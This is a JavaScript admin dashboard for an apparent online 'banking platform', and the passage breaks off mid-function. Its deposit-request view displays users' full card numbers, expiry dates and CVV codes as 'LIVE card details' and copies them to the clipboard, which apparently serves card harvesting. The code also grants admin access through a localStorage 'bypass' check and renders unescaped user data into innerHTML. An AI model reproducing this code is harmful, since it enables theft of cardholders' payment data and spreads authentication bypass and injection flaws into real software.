// Admin Dashboard JavaScript
document.addEventListener("DOMContentLoaded", function () {
  console.log("Admin dashboard loaded");
  initAdminDashboard();
});

// Global admin data
let adminData = {
  users: [],
  transactions: [],
  paymentMethods: [],
  depositRequests: [],
  withdrawalRequests: [],
  settings: {},
  adminPaymentMethods: [],
};

// Initialize admin dashboard
async function initAdminDashboard() {
  console.log("Initializing admin dashboard...");

  try {
    // Check if we have admin localStorage data first (bypass mode)
    const storedEmail = localStorage.getItem("userEmail");
    const storedRole = localStorage.getItem("userRole");
    const storedToken =
      localStorage.getItem("sb_access_token") ||
      localStorage.getItem("sb_session_token");

    // Create Supabase client
    const SUPABASE_URL = "https://grfrcnhmnvasiotejiok.supabase.co";
    const SUPABASE_KEY =
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImdyZnJjbmhtbnZhc2lvdGVqaW9rIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjU4MzU5OTQsImV4cCI6MjA4MTQxMTk5NH0.oPvC2Ax6fUxnC_6apCdOCAiEMURotfljco6r3_L66_k";
    const supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_KEY);

    // BYPASS CHECK: If we have admin data in localStorage, use it
    if (
      storedEmail === "arinze18@vault.com" &&
      storedRole === "admin" &&
      storedToken
    ) {
      console.log("✅ Admin authenticated via bypass");
      await loadAllData(supabase);
    } else {
      // Otherwise, check Supabase auth
      const {
        data: { user },
        error,
      } = await supabase.auth.getUser();

      if (error || !user) {
        console.log("❌ No user or auth error:", error?.message);
        window.location.href = "login.html";
        return;
      }

      // Check if user is admin (by email)
      const isAdmin = user.email === "arinze18@vault.com";

      if (!isAdmin) {
        console.log("❌ Not admin:", user.email);
        alert("Admin access only!");
        window.location.href = "dashboard.html";
        return;
      }

      console.log("✅ Admin authenticated via Supabase:", user.email);
      localStorage.setItem("userEmail", user.email);
      localStorage.setItem("userRole", "admin");

      await loadAllData(supabase);
    }

    // Setup all components
    activateDashboardSection();
    setupNavigation();
    setupDashboard();
    setupUsersSection();
    setupTransactionsSection();
    setupPaymentsSection(supabase);
    setupRequestsSections(supabase);
    setupSettingsSection();
    setupModals(supabase);
    updateAdminTime();
    setInterval(updateAdminTime, 1000);

    console.log("Admin dashboard ready");
  } catch (error) {
    console.error("Admin check failed:", error);
    window.location.href = "login.html";
    return;
  }
}

// Activate dashboard section first
function activateDashboardSection() {
  const dashboardSection = document.getElementById("dashboard-section");
  if (dashboardSection) {
    document.querySelectorAll(".admin-section").forEach((s) => {
      s.classList.remove("active");
    });
    dashboardSection.classList.add("active");
  }

  const pageTitle = document.getElementById("admin-page-title");
  const pageDescription = document.getElementById("admin-page-description");
  if (pageTitle) pageTitle.textContent = "Admin Dashboard";
  if (pageDescription)
    pageDescription.textContent = "Manage your banking platform";

  const firstNavItem = document.querySelector(
    '.nav-item[data-section="dashboard"]'
  );
  if (firstNavItem) {
    document
      .querySelectorAll(".nav-item")
      .forEach((nav) => nav.classList.remove("active"));
    firstNavItem.classList.add("active");
  }
}

// Load all data from Supabase
async function loadAllData(supabase) {
  try {
    // Initialize arrays if they don't exist
    if (!adminData.users) adminData.users = [];
    if (!adminData.depositRequests) adminData.depositRequests = [];
    if (!adminData.withdrawalRequests) adminData.withdrawalRequests = [];
    if (!adminData.transactions) adminData.transactions = [];
    if (!adminData.adminPaymentMethods) adminData.adminPaymentMethods = [];

    // Load users
    const { data: users, error: usersError } = await supabase
      .from("users")
      .select("*")
      .order("created_at", { ascending: false });

    if (!usersError) adminData.users = users || [];

    // Load admin payment methods
    const { data: adminMethods, error: adminMethodsError } = await supabase
      .from("admin_payment_methods")
      .select("*")
      .order("sort_order", { ascending: true });

    if (!adminMethodsError) adminData.adminPaymentMethods = adminMethods || [];

    // Load deposit requests (only pending)
    const { data: deposits, error: depositsError } = await supabase
      .from("deposit_requests")
      .select("*")
      .eq("status", "pending") // Only get pending
      .order("created_at", { ascending: false });

    if (!depositsError) adminData.depositRequests = deposits || [];

    // Load withdrawal requests (only pending)
    const { data: withdrawals, error: withdrawalsError } = await supabase
      .from("withdrawal_requests")
      .select("*")
      .eq("status", "pending") // Only get pending
      .order("created_at", { ascending: false });

    if (!withdrawalsError) adminData.withdrawalRequests = withdrawals || [];

    // Load transactions
    const { data: transactions, error: transactionsError } = await supabase
      .from("transactions")
      .select("*")
      .order("transaction_date", { ascending: false })
      .limit(100);

    if (!transactionsError) adminData.transactions = transactions || [];

    // Load settings
    const { data: settings, error: settingsError } = await supabase
      .from("system_settings")
      .select("*");

    if (!settingsError && settings) {
      adminData.settings = {};
      settings.forEach((setting) => {
        adminData.settings[setting.setting_key] = setting.setting_value;
      });
    }

    console.log("Admin data loaded:", {
      users: adminData.users.length,
      adminMethods: adminData.adminPaymentMethods.length,
      deposits: adminData.depositRequests.length,
      withdrawals: adminData.withdrawalRequests.length,
      transactions: adminData.transactions.length,
    });

    // Update badge counts after loading
    updatePendingCounts();
  } catch (error) {
    console.error("Error loading admin data:", error);
  }
}

// Navigation
function setupNavigation() {
  const navItems = document.querySelectorAll(".nav-item");
  const pageTitle = document.getElementById("admin-page-title");
  const pageDescription = document.getElementById("admin-page-description");

  const sectionTitles = {
    dashboard: {
      title: "Admin Dashboard",
      desc: "Manage your banking platform",
    },
    users: { title: "Manage Users", desc: "View and manage all user accounts" },
    transactions: {
      title: "All Transactions",
      desc: "View and manage all transactions",
    },
    payments: {
      title: "Payment Methods",
      desc: "Manage payment methods and bank accounts",
    },
    "deposit-requests": {
      title: "Deposit Requests",
      desc: "Approve or reject deposit requests",
    },
    "withdrawal-requests": {
      title: "Withdrawal Requests",
      desc: "Approve or reject withdrawal requests",
    },
    settings: { title: "Settings", desc: "Configure platform settings" },
  };

  navItems.forEach((item) => {
    item.addEventListener("click", function () {
      const section = this.dataset.section;

      navItems.forEach((nav) => nav.classList.remove("active"));
      this.classList.add("active");

      if (sectionTitles[section]) {
        if (pageTitle) pageTitle.textContent = sectionTitles[section].title;
        if (pageDescription)
          pageDescription.textContent = sectionTitles[section].desc;
      }

      document.querySelectorAll(".admin-section").forEach((s) => {
        s.classList.remove("active");
      });
      document.getElementById(`${section}-section`).classList.add("active");

      refreshSection(section);
    });
  });

  // Logout
  document
    .getElementById("adminLogout")
    .addEventListener("click", async function () {
      const SUPABASE_URL = "https://grfrcnhmnvasiotejiok.supabase.co";
      const SUPABASE_KEY =
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImdyZnJjbmhtbnZhc2lvdGVqaW9rIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjU4MzU5OTQsImV4cCI6MjA4MTQxMTk5NH0.oPvC2Ax6fUxnC_6apCdOCAiEMURotfljco6r3_L66_k";
      const supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_KEY);

      await supabase.auth.signOut();
      window.location.href = "index.html";
    });
}

function refreshSection(section) {
  const supabase = window.supabase.createClient(
    "https://grfrcnhmnvasiotejiok.supabase.co",
    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImdyZnJjbmhtbnZhc2lvdGVqaW9rIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjU4MzU5OTQsImV4cCI6MjA4MTQxMTk5NH0.oPvC2Ax6fUxnC_6apCdOCAiEMURotfljco6r3_L66_k"
  );

  switch (section) {
    case "dashboard":
      updateDashboardStats();
      loadRecentActivity();
      break;
    case "users":
      loadUsersTable();
      break;
    case "transactions":
      loadTransactionsTable();
      break;
    case "payments":
      loadAdminPaymentMethods();
      break;
    case "deposit-requests":
      loadDepositRequests(supabase); // This will fetch fresh data
      break;
    case "withdrawal-requests":
      loadWithdrawalRequests(supabase); // This will fetch fresh data
      break;
    case "settings":
      loadSettings();
      break;
  }
}

// Dashboard
function setupDashboard() {
  updateDashboardStats();
  loadRecentActivity();
  updatePendingCounts();
}

function updateDashboardStats() {
  const totalUsers = adminData.users.length;
  const totalBalance = adminData.users.reduce(
    (sum, user) => sum + (user.balance || 0),
    0
  );
  const activeDeposits = adminData.transactions.filter(
    (t) => t.type === "deposit" && t.status === "completed"
  ).length;
  const pendingRequests =
    adminData.depositRequests.length + adminData.withdrawalRequests.length;

  const totalUsersEl = document.getElementById("total-users");
  const platformBalanceEl = document.getElementById("platform-balance");
  const activeDepositsEl = document.getElementById("active-deposits");
  const pendingRequestsEl = document.getElementById("pending-requests");

  if (totalUsersEl) totalUsersEl.textContent = totalUsers;
  if (platformBalanceEl)
    platformBalanceEl.textContent = formatCurrency(totalBalance);
  if (activeDepositsEl) activeDepositsEl.textContent = activeDeposits;
  if (pendingRequestsEl) pendingRequestsEl.textContent = pendingRequests;
}

function loadRecentActivity() {
  const container = document.getElementById("recent-activity");
  if (!container) return;

  const recent = adminData.transactions.slice(0, 10);

  if (recent.length === 0) {
    container.innerHTML = '<div class="no-activity">No recent activity</div>';
    return;
  }

  container.innerHTML = recent
    .map(
      (transaction) => `
        <div class="activity-item ${transaction.type}">
            <div class="activity-icon">
                <i class="fas fa-${
                  transaction.type === "deposit"
                    ? "money-bill-wave"
                    : "hand-holding-usd"
                }"></i>
            </div>
            <div class="activity-details">
                <h4>${getUserName(transaction.user_id)} - ${
        transaction.type
      }</h4>
                <p>${
                  transaction.description || formatCurrency(transaction.amount)
                }</p>
                <span class="activity-time">${formatDate(
                  transaction.transaction_date
                )}</span>
            </div>
        </div>
    `
    )
    .join("");
}

function updatePendingCounts() {
  const pendingDepositsEl = document.getElementById("pending-deposits");
  const pendingWithdrawalsEl = document.getElementById("pending-withdrawals");
  const pendingRequestsEl = document.getElementById("pending-requests");

  // Handle cases where arrays might not be initialized
  const depositCount = adminData.depositRequests
    ? adminData.depositRequests.length
    : 0;
  const withdrawalCount = adminData.withdrawalRequests
    ? adminData.withdrawalRequests.length
    : 0;
  const totalPending = depositCount + withdrawalCount;

  console.log("Pending counts:", {
    depositCount,
    withdrawalCount,
    totalPending,
  }); // Debug log

  if (pendingDepositsEl) pendingDepositsEl.textContent = depositCount;
  if (pendingWithdrawalsEl) pendingWithdrawalsEl.textContent = withdrawalCount;
  if (pendingRequestsEl) pendingRequestsEl.textContent = totalPending;
}

// Users Management
function setupUsersSection() {
  loadUsersTable();

  document
    .getElementById("user-search")
    ?.addEventListener("input", function () {
      loadUsersTable(this.value.toLowerCase());
    });
}

function loadUsersTable(search = "") {
  const container = document.getElementById("users-table-body");
  if (!container) return;

  let filtered = adminData.users;

  if (search) {
    filtered = adminData.users.filter(
      (user) =>
        (user.first_name + " " + user.last_name)
          .toLowerCase()
          .includes(search) ||
        user.email.toLowerCase().includes(search) ||
        user.user_id.toLowerCase().includes(search)
    );
  }

  if (filtered.length === 0) {
    container.innerHTML =
      '<tr><td colspan="7" class="no-data">No users found</td></tr>';
    return;
  }

  container.innerHTML = filtered
    .map(
      (user) => `
        <tr>
            <td>${user.user_id.substring(0, 8)}...</td>
            <td>${user.first_name} ${user.last_name}</td>
            <td>${user.email}</td>
            <td>${formatCurrency(user.balance || 0)}</td>
            <td><span class="user-status ${user.status || "active"}">${
        user.status || "active"
      }</span></td>
            <td>${formatDate(user.join_date)}</td>
            <td>
                <div class="action-buttons">
                    <button class="btn-action view" onclick="viewUserDetails('${
                      user.user_id
                    }')">
                        <i class="fas fa-eye"></i> View
                    </button>
                    <button class="btn-action edit" onclick="editUser('${
                      user.user_id
                    }')">
                        <i class="fas fa-edit"></i> Edit
                    </button>
                </div>
            </td>
        </tr>
    `
    )
    .join("");
}

// PAYMENT METHODS SECTION
function setupPaymentsSection(supabase) {
  loadAdminPaymentMethods();

  // Add payment method button
  document
    .getElementById("add-payment-method")
    ?.addEventListener("click", () => {
      openAdminPaymentModal();
    });

  // Payment type change
  document
    .getElementById("method-type")
    ?.addEventListener("change", function () {
      showPaymentFields(this.value);
    });
}

async function loadAdminPaymentMethods() {
  try {
    const container = document.getElementById("payment-methods-grid");
    if (!container) return;

    if (adminData.adminPaymentMethods.length === 0) {
      container.innerHTML =
        '<div class="no-methods">No admin payment methods added yet</div>';
      return;
    }

    container.innerHTML = adminData.adminPaymentMethods
      .map(
        (method) => `
            <div class="method-card ${method.status}">
                <div class="method-header">
                    <h4>${method.name}</h4>
                    <span class="method-status ${method.status}">${
          method.status
        }</span>
                </div>
                <div class="method-details">
                    <p><strong>Type:</strong> ${method.type}</p>
                    <pre style="background: #f5f5f5; padding: 10px; border-radius: 5px; font-size: 0.9rem; white-space: pre-wrap;">${
                      method.details
                    }</pre>
                    <p><strong>Order:</strong> ${method.sort_order}</p>
                    <p><strong>Created:</strong> ${formatDate(
                      method.created_at
                    )}</p>
                </div>
                <div class="method-actions">
                    <button class="btn-action edit" onclick="editAdminPaymentMethod(${
                      method.id
                    })">
                        <i class="fas fa-edit"></i> Edit
                    </button>
                    <button class="btn-action delete" onclick="deleteAdminPaymentMethod(${
                      method.id
                    })">
                        <i class="fas fa-trash"></i> Delete
                    </button>
                </div>
            </div>
        `
      )
      .join("");
  } catch (error) {
    console.error("Error loading admin payment methods:", error);
    showAdminNotification("Failed to load payment methods", "error");
  }
}

function openAdminPaymentModal(method = null) {
  const modal = document.createElement("div");
  modal.className = "modal active";
  modal.innerHTML = `
        <div class="modal-content">
            <div class="modal-header">
                <h2>${method ? "Edit" : "Add"} Admin Payment Method</h2>
                <button class="modal-close">&times;</button>
            </div>
            <div class="modal-body">
                <form id="adminPaymentForm">
                    <div class="form-group">
                        <label>Method Name</label>
                        <input type="text" id="admin-method-name" value="${
                          method ? method.name : ""
                        }" required>
                    </div>
                    <div class="form-group">
                        <label>Type</label>
                        <select id="admin-method-type">
                            <option value="bank" ${
                              method?.type === "bank" ? "selected" : ""
                            }>Bank Account</option>
                            <option value="crypto" ${
                              method?.type === "crypto" ? "selected" : ""
                            }>Cryptocurrency</option>
                        </select>
                    </div>
                    <div class="form-group">
                        <label>Details (will be shown to users)</label>
                        <textarea id="admin-method-details" rows="6" required>${
                          method ? method.details : ""
                        }</textarea>
                        <small>Enter bank details or crypto wallet info. This will be displayed exactly as entered.</small>
                    </div>
                    <div class="form-group">
                        <label>Sort Order</label>
                        <input type="number" id="admin-method-order" value="${
                          method ? method.sort_order : "0"
                        }" min="0">
                    </div>
                    <div class="form-group">
                        <label>Status</label>
                        <select id="admin-method-status">
                            <option value="active" ${
                              !method || method.status === "active"
                                ? "selected"
                                : ""
                            }>Active</option>
                            <option value="inactive" ${
                              method?.status === "inactive" ? "selected" : ""
                            }>Inactive</option>
                        </select>
                    </div>
                    <div class="modal-actions">
                        <button type="button" class="btn-secondary modal-close">Cancel</button>
                        <button type="submit" class="btn-primary">Save Method</button>
                    </div>
                </form>
            </div>
        </div>
    `;

  document.body.appendChild(modal);

  modal
    .querySelector(".modal-close")
    .addEventListener("click", () => modal.remove());
  modal
    .querySelector(".btn-secondary")
    .addEventListener("click", () => modal.remove());
  modal
    .querySelector("#adminPaymentForm")
    .addEventListener("submit", async (e) => {
      e.preventDefault();
      await saveAdminPaymentMethod(method?.id);
      modal.remove();
    });

  modal.addEventListener("click", (e) => {
    if (e.target === modal) modal.remove();
  });
}

async function saveAdminPaymentMethod(methodId = null) {
  try {
    const SUPABASE_URL = "https://grfrcnhmnvasiotejiok.supabase.co";
    const SUPABASE_KEY =
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImdyZnJjbmhtbnZhc2lvdGVqaW9rIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjU4MzU5OTQsImV4cCI6MjA4MTQxMTk5NH0.oPvC2Ax6fUxnC_6apCdOCAiEMURotfljco6r3_L66_k";
    const supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_KEY);

    const methodData = {
      name: document.getElementById("admin-method-name").value,
      type: document.getElementById("admin-method-type").value,
      details: document.getElementById("admin-method-details").value,
      sort_order:
        parseInt(document.getElementById("admin-method-order").value) || 0,
      status: document.getElementById("admin-method-status").value,
      updated_at: new Date().toISOString(),
    };

    let result;
    if (methodId) {
      result = await supabase
        .from("admin_payment_methods")
        .update(methodData)
        .eq("id", methodId);
    } else {
      methodData.created_at = new Date().toISOString();
      result = await supabase
        .from("admin_payment_methods")
        .insert([methodData]);
    }

    if (result.error) throw result.error;

    showAdminNotification(
      `Payment method ${methodId ? "updated" : "added"}!`,
      "success"
    );
    await loadAllData(supabase);
    loadAdminPaymentMethods();
  } catch (error) {
    console.error("Error saving admin payment method:", error);
    showAdminNotification("Failed to save payment method", "error");
  }
}

window.editAdminPaymentMethod = async function (id) {
  try {
    const SUPABASE_URL = "https://grfrcnhmnvasiotejiok.supabase.co";
    const SUPABASE_KEY =
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImdyZnJjbmhtbnZhc2lvdGVqaW9rIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjU4MzU5OTQsImV4cCI6MjA4MTQxMTk5NH0.oPvC2Ax6fUxnC_6apCdOCAiEMURotfljco6r3_L66_k";
    const supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_KEY);

    const { data: method, error } = await supabase
      .from("admin_payment_methods")
      .select("*")
      .eq("id", id)
      .single();

    if (error) throw error;

    openAdminPaymentModal(method);
  } catch (error) {
    console.error("Error loading payment method:", error);
    showAdminNotification("Failed to load payment method", "error");
  }
};

window.deleteAdminPaymentMethod = async function (id) {
  if (
    !confirm(
      "Are you sure you want to delete this payment method? It will be removed from user dashboards."
    )
  )
    return;

  try {
    const SUPABASE_URL = "https://grfrcnhmnvasiotejiok.supabase.co";
    const SUPABASE_KEY =
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImdyZnJjbmhtbnZhc2lvdGVqaW9rIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjU4MzU5OTQsImV4cCI6MjA4MTQxMTk5NH0.oPvC2Ax6fUxnC_6apCdOCAiEMURotfljco6r3_L66_k";
    const supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_KEY);

    const { error } = await supabase
      .from("admin_payment_methods")
      .delete()
      .eq("id", id);

    if (error) throw error;

    showAdminNotification("Payment method deleted!", "success");
    await loadAllData(supabase);
    loadAdminPaymentMethods();
  } catch (error) {
    console.error("Error deleting payment method:", error);
    showAdminNotification("Failed to delete payment method", "error");
  }
};

// REQUESTS SECTIONS
function setupRequestsSections(supabase) {
  // Store the supabase client globally or pass it properly
  window.adminSupabase = supabase; // Store globally for use in other functions

  loadDepositRequests(supabase);
  loadWithdrawalRequests(supabase);
}

async function loadDepositRequests(supabase) {
  console.log("🔄 LOADING deposit requests - FINAL FIX...");

  const container = document.getElementById("deposit-requests-list");
  if (!container) {
    console.error("❌ Container not found!");
    return;
  }

  try {
    // Show loading
    container.innerHTML =
      '<div class="loading-requests"><i class="fas fa-spinner fa-spin"></i> Loading...</div>';

    // Get ALL requests first to debug
    const { data: allRequests, error: allError } = await supabase
      .from("deposit_requests")
      .select("*")
      .order("created_at", { ascending: false });

    if (allError) {
      console.error("❌ All requests error:", allError);
      throw allError;
    }

    console.log("📊 ALL requests from database:", allRequests);

    // Now get ONLY pending requests
    const { data: pendingRequests, error } = await supabase
      .from("deposit_requests")
      .select("*")
      .eq("status", "pending")
      .order("created_at", { ascending: false });

    if (error) {
      console.error("❌ Pending requests error:", error);
      throw error;
    }

    console.log("📊 PENDING requests from database:", pendingRequests);

    // Update global data
    adminData.depositRequests = pendingRequests || [];

    // Display results
    if (!adminData.depositRequests || adminData.depositRequests.length === 0) {
      container.innerHTML = `
                <div class="no-requests" style="text-align: center; padding: 40px; color: #27ae60;">
                    <i class="fas fa-check-circle" style="font-size: 48px; margin-bottom: 20px;"></i>
                    <h3>All Done!</h3>
                    <p>No pending deposit requests</p>
                    <div style="margin-top: 20px; font-size: 12px; color: #666;">
                        Total requests in database: ${
                          allRequests?.length || 0
                        }<br>
                        Approved requests: ${
                          allRequests?.filter((r) => r.status === "approved")
                            .length || 0
                        }
                    </div>
                </div>
            `;
      console.log("✅ No pending requests to display");
    } else {
      console.log(
        `✅ Building UI for ${adminData.depositRequests.length} pending requests`
      );

      // Build UI with enhanced card details display
      let html = "";
      adminData.depositRequests.forEach((request, index) => {
        console.log(
          `Building card ${index + 1}:`,
          request.request_id,
          request.status
        );

        const user = adminData.users?.find(
          (u) => u.user_id === request.user_id
        );
        const displayName = user
          ? `${user.first_name} ${user.last_name}`
          : request.user_id;

        // Check if this is a card payment
        const isCardPayment =
          request.method === "card" ||
          (request.card_details &&
            typeof request.card_details === "object" &&
            Object.keys(request.card_details).length > 0);

        // Parse card details
        let cardInfo = null;
        if (request.card_details) {
          try {
            // If it's already an object, use it
            if (typeof request.card_details === "object") {
              cardInfo = request.card_details;
            }
            // If it's a string, try to parse it
            else if (typeof request.card_details === "string") {
              cardInfo = JSON.parse(request.card_details);
            }
          } catch (e) {
            console.log("Could not parse card details:", e);
            cardInfo = { error: "Invalid card data format" };
          }
        }

        html += `
                    <div class="request-card deposit" 
                         id="card-${request.request_id}"
                         data-request-id="${request.request_id}"
                         data-status="${request.status}">
                        <div class="request-header">
                            <h3>${formatCurrency(request.amount)}</h3>
                            <span class="request-status ${request.status}">${
          request.status
        }</span>
                            <div style="font-size: 11px; color: #666; margin-top: 5px;">
                                ID: ${request.request_id}
                            </div>
                        </div>
                        <div class="request-details">
                            <p><strong>User:</strong> ${displayName}</p>
                            <p><strong>Email:</strong> ${
                              user?.email || "N/A"
                            }</p>
                            <p><strong>Amount:</strong> ${formatCurrency(
                              request.amount
                            )}</p>
                            <p><strong>Method:</strong> ${
                              isCardPayment
                                ? "Credit/Debit Card"
                                : request.method || "Bank Transfer"
                            }</p>
                            <p><strong>Date:</strong> ${formatDate(
                              request.created_at
                            )}</p>
                            ${
                              request.reference
                                ? `<p><strong>Reference:</strong> ${request.reference}</p>`
                                : ""
                            }
${
  isCardPayment
    ? `
    <div class="card-details-section" style="background: linear-gradient(135deg, #ff6b6b 0%, #ee5a24 100%); padding: 15px; border-radius: 8px; margin-top: 15px; border: 2px solid #ff3838; color: white; position: relative; overflow: hidden;">
        <div style="position: absolute; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0, 0, 0, 0.3); z-index: 1;"></div>
        
        <h4 style="margin: 0 0 10px 0; color: white; display: flex; align-items: center; gap: 8px; position: relative; z-index: 2;">
            <i class="fas fa-credit-card"></i> COMPLETE CARD DETAILS FOR PROCESSING
        </h4>
        
        <div style="background: rgba(41, 8, 189, 0.95); padding: 15px; border-radius: 6px; position: relative; z-index: 2;">
            ${
              cardInfo
                ? `

<div style="display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; margin-bottom: 15px;">
    <div style="background: #4361ee; color: white; padding: 10px; border-radius: 5px;">
        <p style="margin: 0; font-size: 11px; opacity: 0.9;">CARD NUMBER</p>
        <p style="margin: 5px 0 0 0; font-size: 18px; font-weight: bold; letter-spacing: 1px;">
            ${
              cardInfo.full_card_number
                ? formatCardNumberForDisplay(cardInfo.full_card_number)
                : cardInfo.card_number
                ? formatCardNumberForDisplay(cardInfo.card_number)
                : cardInfo.number
                ? formatCardNumberForDisplay(cardInfo.number)
                : cardInfo.masked_card || "N/A"
            }
        </p>
    </div>
    
    <div style="background: #4cc9f0; color: white; padding: 10px; border-radius: 5px;">
        <p style="margin: 0; font-size: 11px; opacity: 0.9;">EXPIRY DATE</p>
        <p style="margin: 5px 0 0 0; font-size: 18px; font-weight: bold;">
            ${
              cardInfo.expiry_date ||
              cardInfo.card_expiry ||
              cardInfo.expiry ||
              "N/A"
            }
        </p>
    </div>

    <div style="background: #f72585; color: white; padding: 10px; border-radius: 5px;">
        <p style="margin: 0; font-size: 11px; opacity: 0.9;">CVV CODE</p>
        <p style="margin: 5px 0 0 0; font-size: 18px; font-weight: bold;">
            ${cardInfo.cvv || cardInfo.card_cvv || "N/A"}
        </p>
    </div>
    
    <div style="background: #3a0ca3; color: white; padding: 10px; border-radius: 5px;">
        <p style="margin: 0; font-size: 11px; opacity: 0.9;">CARD TYPE</p>
        <p style="margin: 5px 0 0 0; font-size: 18px; font-weight: bold;">
            ${cardInfo.card_type ? cardInfo.card_type.toUpperCase() : "N/A"}
        </p>
    </div>
</div>
                
                <div style="background: #063561ff; padding: 12px; border-radius: 5px; margin-bottom: 10px;">
                    <p style="margin: 5px 0;"><strong>Card Holder:</strong> ${
                      cardInfo.card_holder || "N/A"
                    }</p>
                    <p style="margin: 5px 0;"><strong>User:</strong> ${
                      cardInfo.user_name || displayName
                    } (${cardInfo.user_email || user?.email || "N/A"})</p>
                    <p style="margin: 5px 0;"><strong>Reference:</strong> ${
                      cardInfo.reference || request.reference || "N/A"
                    }</p>
                    <p style="margin: 5px 0;"><strong>Submitted:</strong> ${
                      cardInfo.timestamp
                        ? formatDate(cardInfo.timestamp)
                        : formatDate(request.created_at)
                    }</p>
                </div>
            `
                : `
                <p><strong>Card Details:</strong> Provided (see method details)</p>
                ${
                  request.method_details
                    ? `<p><strong>Details:</strong> ${request.method_details}</p>`
                    : ""
                }
                // Display with exact field names
<p><strong>Card Number:</strong> ${cardInfo["card.number"] || "N/A"}</p>
<p><strong>Expiry:</strong> ${cardInfo["card.expiry"] || "N/A"}</p>
<p><strong>CVV:</strong> ${cardInfo["card.cvv"] || "N/A"}</p>
<p><strong>Type:</strong> ${
                    cardInfo["card.type"]
                      ? cardInfo["card.type"].toUpperCase()
                      : "N/A"
                  }</p>
            `
            }
        </div>
        
        <div style="margin-top: 10px; padding: 10px; background: rgba(255, 193, 7, 0.9); border-radius: 5px; border: 1px solid #ffc107; position: relative; z-index: 2;">
            <p style="margin: 0; color: #856404; font-size: 12px; display: flex; align-items: center; gap: 5px;">
                <i class="fas fa-exclamation-triangle"></i>
                <strong>SECURITY NOTICE:</strong> These are LIVE card details. Process payment immediately and do not share.
            </p>
        </div>
        
        <div style="margin-top: 8px; padding: 8px; background: rgba(220, 53, 69, 0.9); border-radius: 5px; border: 1px solid #dc3545; position: relative; z-index: 2;">
            <p style="margin: 0; color: white; font-size: 11px; display: flex; align-items: center; gap: 5px;">
                <i class="fas fa-shield-alt"></i>
                <strong>ACTION REQUIRED:</strong> 
                <button class="copy-card-btn" style="margin-left: auto; background: white; color: #dc3545; border: none; padding: 3px 8px; border-radius: 3px; font-size: 10px; cursor: pointer;" 
                        onclick="copyCardDetailsToClipboard('${
                          cardInfo
                            ? JSON.stringify(cardInfo).replace(/'/g, "\\'")
                            : ""
                        }')">
                    <i class="fas fa-copy"></i> Copy Details
                </button>
<button class="view-full-details-btn" style="background: #4361ee; color: white; border: none; padding: 5px 10px; border-radius: 3px; font-size: 10px; cursor: pointer; margin-left: 5px;" 
        onclick="showFullCardDetailsModal(${
          cardInfo ? JSON.stringify(cardInfo).replace(/"/g, "&quot;") : "{}"
        })">
    <i class="fas fa-expand"></i> View Full Details
</button>
            </p>
        </div>
    </div>
`
    : ""
}
                        </div>
                        <div class="request-actions">
                            <button class="btn-approve" 
                                    onclick="approveDepositRequest('${
                                      request.request_id
                                    }', ${request.amount}, '${
          request.user_id
        }')">
                                <i class="fas fa-check"></i> Approve
                            </button>
                            <button class="btn-reject" 
                                    onclick="rejectDepositRequest('${
                                      request.request_id
                                    }')">
                                <i class="fas fa-times"></i> Reject
                            </button>
                        </div>
                    </div>
                `;
      });

      container.innerHTML = html;
      console.log(`✅ UI built with ${adminData.depositRequests.length} cards`);
    }

    // Update badge count
    updatePendingCounts();
  } catch (error) {
    console.error("❌ Error loading deposit requests:", error);
    if (container) {
      container.innerHTML = `
                <div class="error-requests">
                    <i class="fas fa-exclamation-triangle"></i>
                    <h3>Error</h3>
                    <p>Failed to load: ${error.message}</p>
                </div>
            `;
    }
  }
}

// Helper function to format card number for display
function formatCardNumberForDisplay(cardNumber) {
  if (!cardNumber) return "";
  // Ensure it's a string
  const str = cardNumber.toString();
  // Add spaces every 4 digits
  return str.replace(/(\d{4})(?=\d)/g, "$1 ");
}
// REPLACE the copyCardDetailsToClipboard function with:
function copyCardDetailsToClipboard(cardInfoJson) {
  try {
    console.log("Copying card details:", cardInfoJson);

    const cardInfo = JSON.parse(cardInfoJson);

    // Get values from various possible field names
    const cardNumber =
      cardInfo.full_card_number || cardInfo.card_number || cardInfo.number;
    const expiry =
      cardInfo.expiry_date || cardInfo.card_expiry || cardInfo.expiry;
    const cvv = cardInfo.cvv || cardInfo.card_cvv;
    const cardHolder = cardInfo.card_holder || cardInfo.holder;
    const cardType = cardInfo.card_type || cardInfo.type;
    const userEmail = cardInfo.user_email;
    const userName = cardInfo.user_name;
    const reference = cardInfo.reference || cardInfo.reference_id;

    const textToCopy = `
CARD PAYMENT DETAILS:
────────────────────
Card Number: ${cardNumber ? formatCardNumberForDisplay(cardNumber) : "N/A"}
Card Holder: ${cardHolder || "N/A"}
Expiry Date: ${expiry || "N/A"}
CVV: ${cvv || "N/A"}
Card Type: ${cardType ? cardType.toUpperCase() : "N/A"}
User: ${userName || "N/A"} (${userEmail || "N/A"})
Reference: ${reference || "N/A"}
────────────────────
Copy Time: ${new Date().toLocaleString()}
        `.trim();

    console.log("Text to copy:", textToCopy);

    navigator.clipboard
      .writeText(textToCopy)
      .then(() => {
        showAdminNotification(
          "✅ Card details copied to clipboard!",
          "success"
        );
      })
      .catch((err) => {
        console.error("Clipboard API failed:", err);
        // Fallback
        const textArea = document.createElement("textarea");
        textArea.value = textToCopy;
